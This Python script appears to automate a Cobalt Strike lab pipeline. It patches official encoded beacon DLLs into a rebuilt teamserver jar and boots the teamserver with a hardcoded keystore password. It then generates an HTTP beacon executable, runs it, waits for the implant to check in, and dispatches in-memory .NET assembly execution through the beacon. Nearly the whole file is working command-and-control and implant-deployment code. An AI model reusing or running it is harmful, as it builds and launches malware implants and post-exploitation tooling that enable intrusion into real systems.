# -*- coding: utf-8 -*-
"""c49_official_iea.py - C-49: swap official sleeves into the fixed jar, boot,
generate the official exe (the patchSleepMaskString guard should hold now),
deploy, dispatch iea with the file-marker assembly, verdict."""
import os
import re
import subprocess
import sys
import time
import shutil
from zipfile import ZipFile, ZIP_DEFLATED

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
ENC = r"C:\Users\Public\official_ctrl"
OUT = open(r"C:\Users\Public\c49_official_iea.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()


def main():
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    'Get-CimInstance Win32_Process | Where-Object { $_.Name -match "java.exe|javaw.exe|franken_b1.exe|franken_dbg.exe|official_iea.exe|cdb" } | '
                    'ForEach-Object { Stop-Process -Id $_.ProcessId -Force }'], capture_output=True)
    time.sleep(5)
    for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
        if os.path.exists(f):
            os.remove(f)

    # 1. swap official encoded sleeves into the freshly built jar
    tmpjar = JAR + ".tmp"
    zin = ZipFile(JAR, "r")
    zout = ZipFile(tmpjar, "w", ZIP_DEFLATED)
    enc_main = open(ENC + r"\beacon.x64.dll.enc", "rb").read()
    enc_rl0k = open(ENC + r"\beacon.x64.rl0k.dll.enc", "rb").read()
    for item in zin.infolist():
        data = zin.read(item.filename)
        if item.filename == "sleeve/beacon.x64.dll":
            data = enc_main
            log("swapped beacon.x64.dll -> official enc %dB" % len(data))
        elif item.filename == "sleeve/beacon.x64.rl0k.dll":
            data = enc_rl0k
            log("swapped beacon.x64.rl0k.dll -> official enc %dB" % len(data))
        zout.writestr(item, data)
    zin.close()
    zout.close()
    os.replace(tmpjar, JAR)
    log("jar swapped (official sleeves, fixed pipeline)")

    # 2. boot
    subprocess.Popen([JDK + r"\java.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                      "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                      "-Djavax.net.ssl.keyStorePassword=123456",
                      "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                     cwd=TSBOOT)
    time.sleep(13)
    subprocess.Popen([JDK + r"\javaw.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx512m", "-cp", JAR,
                      "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opOFF", "franken",
                      "headless_franken.cna"],
                     cwd=TSBOOT)
    t0 = time.time()
    while time.time() - t0 < 120:
        if os.path.exists(LOG) and "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
            break
        time.sleep(3)
    log("TS ready")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send

    # 3. generate the official exe
    exe = r"C:\Users\Public\official_iea.exe"
    if os.path.exists(exe):
        os.remove(exe)
    send("artifact", "vnc-http", "exe", "x64", exe.replace("\\", "/"))
    t0 = time.time()
    while not (os.path.exists(exe) and os.path.getsize(exe) > 200000) and time.time() - t0 < 120:
        time.sleep(2)
    size = os.path.getsize(exe) if os.path.exists(exe) else 0
    log("exe: %d B" % size)
    if size <= 0:
        log("VERDICT: FAIL - exe generation still broken")
        return

    # 4. deploy + INITIAL
    seen = set(re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read()))
    subprocess.Popen([exe], cwd=r"C:\Users\Public",
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    bid = None
    deadline = time.time() + 180
    while time.time() < deadline:
        m = re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read())
        new = [x for x in m if x not in seen]
        if new:
            bid = new[-1]
            break
        time.sleep(5)
    log("INITIAL: %s" % (bid or "NONE"))
    if not bid:
        log("VERDICT: FAIL - no checkin")
        return
    send("target", bid)
    time.sleep(2)

    # 5. iea dispatch with the file-marker assembly
    if os.path.exists(r"C:\Users\Public\iea_ran.txt"):
        os.remove(r"C:\Users\Public\iea_ran.txt")
    p0 = len(open(LOG, encoding="utf-8", errors="replace").read())
    send("iea", "C:/Users/Public/iea.x64.o", "C:/Users/Public/TestAssembly.exe", "IEA-TEST-OK")
    log("iea dispatched")
    time.sleep(20)
    time.sleep(60)
    seg = open(LOG, encoding="utf-8", errors="replace").read()[p0:]
    for ln in seg.splitlines():
        if "HEART" not in ln and ln.strip():
            log(" | " + ln[:160])
    alive = "HEART\t" + bid + "\talive=true" in open(LOG, encoding="utf-8", errors="replace").read()[-3000:]
    marker = os.path.exists(r"C:\Users\Public\iea_ran.txt")
    out_ok = bool(re.search(r"received output", seg))
    log("beacon alive: %s" % alive)
    log("file marker: %s" % marker)
    log("output: %s" % out_ok)
    log("VERDICT: %s" % ("OFFICIAL-RUN" if (alive and (marker or out_ok)) else
                         "OFFICIAL-ALIVE-NO-CLR" if alive else "OFFICIAL-DIED"))


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
